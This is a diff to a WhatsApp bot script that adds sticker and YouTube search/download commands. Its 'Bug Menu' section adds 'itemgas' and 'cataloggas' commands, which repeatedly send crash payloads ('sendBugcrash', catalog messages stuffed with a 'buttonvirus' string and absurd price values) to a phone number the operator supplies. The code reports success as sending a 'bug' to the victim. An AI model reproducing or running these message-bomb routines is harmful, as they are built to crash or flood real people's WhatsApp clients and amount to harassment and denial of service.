@@ -7,6 +7,7 @@ const { buttonvirus } = require('./scrape/buttonvirus')
 const { color, bgcolor } = require('./lib/color')
 const { uptotelegra } = require('./scrape/upload')
 const tiktok = require('./scrape/tiktok')
+const yts = require('./scrape/yt-search')
 const audionye = fs.readFileSync('./y.mp3')
 const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())
 
@@ -25,7 +26,7 @@ global.ownerName = 'Creator Kayla'
 global.ownerNumber = ["6287705048235@s.whatsapp.net"]
 global.prefa = ['','.']
 global.mess = {
-    wait: '? Wait Sis Please be patient',
+    wait: 'Wait Sis Please be patient',
     succes: 'Good Luck Sis ?',
     admin: 'Group Admin Special Features!!!',
     botAdmin: 'Bots Must Be Admins First!!!',
@@ -231,10 +232,14 @@ ${prefix}owner
 ${prefix}cecan
 ${prefix}obfus (kode js)
 ${prefix}styletext (teks)
+${prefix}attp (teks)
 ${prefix}tourl (kirim/reply media)
 ${prefix}toimg (reply sticker)
-${prefix}toaudio (reply video)
 ${prefix}sticker (kirim/reply image/video/gifs)
+${prefix}ytsearch (judul lagu)
+${prefix}play (judul lagu)
+${prefix}mp3 (link yt)
+${prefix}mp4 (link yt)
 
    Bug Menu
 ${prefix}kaystick (Private/Group)
@@ -245,6 +250,8 @@ ${prefix}kaykontak (Private/Group)
 ${prefix}kayloc (Private/Group)
 ${prefix}kayvn (Private/Group)
 ${prefix}stickgas (Private)
+${prefix}itemgas (Private)
+${prefix}cataloggas (Private)
 
 Thanks To
 Allah SWT
@@ -269,7 +276,7 @@ contextInfo: {
 "mentionedJid": [sender, botzkayla],
 "externalAdReply": {
 "showAdAttribution": true,
-"title": `Hai Kak ${pushname}👋🏻`, 
+"title": `Hai Kak ${pushname}`, 
 "mediaType": 2, 
 "thumbnail": ppnyauser,
 "previewType": "VIDEO",
@@ -296,19 +303,161 @@ var yeye = await fetchJson("https://kirbotz-api.herokuapp.com/api/random/cecan?a
 kayla.sendMessage(from,{image:{url:yeye.result.url},caption: `${mess.succes}`}, { quoted: kaylabotwhatsapp } )
 }
 break
+case 'ttp':
+if (args.length == 0) return kaylabotwhatsapp.reply(`Contoh: ${prefix + command} Hai`)
+let ka = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${q}`)
+kirbotz.sendMessage(from, { sticker: gehdhe, contextInfo: {
+"mentionedJid": [sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"title": `Hai Kak ${pushname}`, 
+"mediaType": 2, 
+"thumbnail": ppnyauser,
+"previewType": "VIDEO",
+"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
+"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'}}}, { quoted: kaylabotwhatsapp })
+break
+case 'attp':
+if (args.length == 0) return kaylabotwhatsapp.reply(`Contoh: ${prefix + command} Hai`)
+gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
+kayla.sendMessage(from, { sticker: gehdhe, contextInfo: {
+"mentionedJid": [sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"title": `Hai Kak ${pushname}`, 
+"mediaType": 2, 
+"thumbnail": ppnyauser,
+"previewType": "VIDEO",
+"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
+"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'}}}, { quoted: kaylabotwhatsapp })
+break
 case 'tiktok': case 'tiktoknowm':{
 if (!q) return kaylabotwhatsapp.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
 let res = await tiktok(q)
 kayla.sendMessage(from,{video:{url:res.nowm},caption: `${mess.succes}`}, { quoted: kaylabotwhatsapp } )
 }
 break
-case 'toaudio': {
-if (!/video/.test(mime) && !/audio/.test(mime)) return kaylabotwhatsapp.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
-if (!kaylabotwhatsapp.quoted) return kaylabotwhatsapp.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
-let media = await quoted.download()
-let { toAudio } = require('./lib/toaudio')
-let audio = await toAudio(media, 'mp4')
-kayla.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : kaylabotwhatsapp })
+case 'search':
+case 'ytsearch':
+if (args.length < 1) return kaylabotwhatsapp.reply(`Contoh:\n${command} bukti Virgoun`)
+let list_rows = [];
+const data = await yts(q);
+for(let a of data.all) {
+list_rows.push({
+title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`, rowId: `.play ${a.url}`
+})
+}
+const button = {
+title: `Hasil Pencarian Dari ${q}`,
+description: "Silahkan Tap Tombol Dibawah",
+footerText: `Created By Kayla`,
+buttonText: 'Tap Disini',
+listType: 'SINGLE_SELECT',
+sections: [
+{
+title: "Hasil Pencarian", 
+rows: list_rows
+}
+]
+}
+const templateList = generateWAMessageFromContent(from, proto.Message.fromObject({ "listMessage": button }), {});
+kayla.relayMessage(from, templateList.message, { messageId: templateList.key.id });
+break
+case 'play':{
+if (!text) return kaylabotwhatsapp.reply(`Example : ${prefix+command} story wa anime`)
+let search = await yts(text)
+url = search.videos[0].url
+let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
+eek = await getBuffer(anu.thumbnail)
+owned = '6287705048235'
+ngen = `
+Title : ${anu.title}
+Ext : Search
+ID : ${anu.videoId}
+Viewers : ${anu.views}
+Upload At : ${anu.ago}
+Author : ${anu.author.name}
+Channel : ${anu.author.url}`
+let buttonse = [
+{buttonId: `${prefix}mp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
+{buttonId: `${prefix}mp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
+]
+let buttonMessages = {
+image: eek, 
+jpegThumbnail: eek,
+caption: ngen,
+fileLength: "99999999999",
+mentions:[sender, owned],
+footer: `_Powered By @${owned.split("@")[0]}_`,
+buttons: buttonse,
+headerType: 4,
+contextInfo: {
+"mentionedJid": [sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"title": `Jangan Spam Yah`, 
+"mediaType": 2, 
+"thumbnail": eek,
+"previewType": "VIDEO",
+"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
+"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
+}}
+}
+kayla.sendMessage(from, buttonMessages, { quoted: {
+key: {
+fromMe: false,
+participant: `0@s.whatsapp.net`,
+remoteJid: "6281903153426-1626053991@g.us"
+},
+message: {
+orderMessage: {
+itemCount: 99999999,
+status: 1,
+surface: 1,
+message: 'Created By Kayla',
+orderTitle: '999999999', 
+sellerJid: `0@s.whatsapp.net` 
+}
+}
+}})
+}
+break
+case 'mp3': {
+let { yta } = require('./lib/yt')
+if (!text) throw `Example : ${prefix+command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
+let quality = args[1] ? args[1] : '128kbps'
+let media = await yta(text, quality)
+if (media.filesize >= 100000) return kaylabotwhatsapp.reply('File Melebihi Batas '+util.format(media))
+kayla.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt:true, contextInfo:{
+"mentionedJid": [sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"title": `Jangan Lupa Bilang Makasih`, 
+"mediaType": 2, 
+"thumbnail": ppnyauser,
+"previewType": "VIDEO",
+"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
+"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
+}}}, { quoted: kaylabotwhatsapp })
+}
+break
+case 'mp4': {
+let { ytv } = require('./lib/yt')
+if (!text) throw `Example : ${prefix+command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
+let quality = args[1] ? args[1] : '360p'
+let media = await ytv(text, quality)
+if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
+kayla.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `? Title : ${media.title}\n? File Size : ${media.filesizeF}\n? Url : ${isUrl(text)}\n? Ext : MP4\n? Resolusi : ${args[1] || '360p'}`, contextInfo:{
+"mentionedJid": [sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"title": `Jangan Lupa Bilang Makasih`, 
+"mediaType": 2, 
+"thumbnail": ppnyauser,
+"previewType": "VIDEO",
+"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
+"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
+}}}, { quoted: kaylabotwhatsapp })
 }
 break
 case 'setppbot': {
@@ -414,6 +563,51 @@ jumlah = '25'
 waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
+await sleep(ms(waktu))
+}
+kaylabotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
+}
+break
+case 'itemgas': {
+if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
+if (!q) return kaylabotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+num = `${q}`+'@s.whatsapp.net'
+jumlah = '25'
+waktu = '5s'
+for (let i = 0; i < jumlah; i++) {
+sendBugcrash(num, 'Hallo Kak', 'Aku KirBotz', 'Minta Donasi Nya Donk Kak', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+await sleep(ms(waktu))
+}
+kaylabotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
+}
+break
+case 'cataloggas': {
+if (!itsMeKayla) return kaylabotwhatsapp.reply(mess.owner)
+if (!q) return kaylabotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+num = `${q}`+'@s.whatsapp.net'
+jumlah = '25'
+waktu = '5s'
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
+var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "7091718154232528",
+"title": `Tes Doank`,
+"description": `${buttonvirus}${buttonvirus}`,
+"currencyCode": "IDR",
+"priceAmount1000": "100000000000000000",
+"productImageCount": 1,
+"firstImageId": 1,
+"salePriceAmount1000": "1000",
+"retailerId": `Nomor Owner Di Atas`,
+"url": `https://wa.me/6287705048235`
+},
+"businessOwnerJid": "6287705048235@s.whatsapp.net",
+}
+}), { userJid: from, quoted: lep  })
+kayla.relayMessage(num, catalog.message, { messageId: catalog.key.id })
 await sleep(ms(waktu))
 }
 kaylabotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
